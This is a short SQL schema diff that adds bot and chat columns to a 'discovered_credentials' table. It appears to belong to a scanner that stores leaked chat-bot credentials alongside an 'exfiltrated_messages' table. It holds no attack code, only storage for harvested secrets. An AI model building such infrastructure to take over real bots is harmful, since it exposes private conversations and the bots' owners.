@@ -17,6 +17,14 @@ CREATE TABLE IF NOT EXISTS discovered_credentials (
 -- but here we might just query by ID or scan. Adding index on status is useful).
 CREATE INDEX IF NOT EXISTS idx_creds_status ON discovered_credentials(status);
 
+-- Optional columns written by scanner (safe to add; ignored if already exist)
+ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS bot_username TEXT;
+ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS bot_id TEXT;
+ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS chat_name TEXT;
+ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS chat_type TEXT;
+
+CREATE INDEX IF NOT EXISTS idx_creds_bot_id ON discovered_credentials(bot_id);
+
 
 -- Table: exfiltrated_messages
 CREATE TABLE IF NOT EXISTS exfiltrated_messages (
